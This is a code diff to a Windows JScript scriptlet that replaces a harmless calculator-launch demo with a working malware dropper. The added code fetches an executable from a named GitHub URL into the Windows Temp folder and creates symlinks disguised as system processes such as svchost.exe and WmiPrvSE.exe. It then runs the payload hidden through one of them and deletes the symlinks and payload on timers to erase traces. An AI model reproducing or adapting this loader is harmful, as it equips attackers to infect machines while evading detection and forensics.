@@ -1,23 +1,84 @@
-<?XML version="1.0"?>
-<scriptlet>
-<registration
-    description="Test"
-    progid="Test"
-    version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
->
-</registration>
-
-<public>
-    <method name="Exec"></method>
-</public>
-
 <script language="JScript">
 <![CDATA[
-    function Exec() {
-        var shell = new ActiveXObject("WScript.Shell");
-        shell.Run("calc.exe"); // Exemplo inofensivo
-    }
+function Exec() {
+    try {
+        var tempDir = "C:\\Windows\\Temp\\";
+        var system32Dir = "C:\\Windows\\System32\\";
+        var payloadName = "cache_" + generateRandomName();
+        var payloadPath = tempDir + payloadName; // Sem extensão
+        
+        // Symlinks com nomes legítimos
+        var symlinks = [
+            tempDir + "dllhost.exe",
+            tempDir + "svchost.exe", 
+            tempDir + "taskhostw.exe",
+            system32Dir + "wbem\\WmiPrvSE.exe"
+        ];
+        
+        // Download do payload
+        var payloadUrl = "https://github.com/fonfon08/mystuffzx/raw/refs/heads/main/exelon.exe";
+        if (downloadFile(payloadUrl, payloadPath)) {
+            
+            var shell = new ActiveXObject("WScript.Shell");
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            
+            // Criar múltiplos symlinks
+            for (var i = 0; i < symlinks.length; i++) {
+                try {
+                    shell.Run("cmd /c mklink \"" + symlinks[i] + "\" \"" + payloadPath + "\"", 0, true);
+                } catch(e) {}
+            }
+            
+            // Executar via um dos symlinks
+            shell.Run(symlinks[0], 0, false);
+            
+            // Limpeza gradual
+            setTimeout(function() {
+                // Remover symlinks
+                for (var i = 0; i < symlinks.length; i++) {
+                    try {
+                        if (fso.FileExists(symlinks[i])) {
+                            fso.DeleteFile(symlinks[i], true);
+                        }
+                    } catch(e) {}
+                }
+                
+                // Remover payload original após tempo
+                setTimeout(function() {
+                    try {
+                        if (fso.FileExists(payloadPath)) {
+                            fso.DeleteFile(payloadPath, true);
+                        }
+                    } catch(e) {}
+                }, 30000);
+                
+            }, 10000);
+        }
+        
+    } catch(e) {}
+}
+
+function generateRandomName() {
+    return Math.random().toString(36).substring(2, 12);
+}
+
+function downloadFile(url, filePath) {
+    try {
+        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+        http.Open("GET", url, false);
+        http.Send();
+        
+        if (http.Status === 200) {
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Type = 1;
+            stream.Open();
+            stream.Write(http.ResponseBody);
+            stream.SaveToFile(filePath, 2);
+            stream.Close();
+            return true;
+        }
+    } catch(e) {}
+    return false;
+}
 ]]>
 </script>
-</scriptlet>
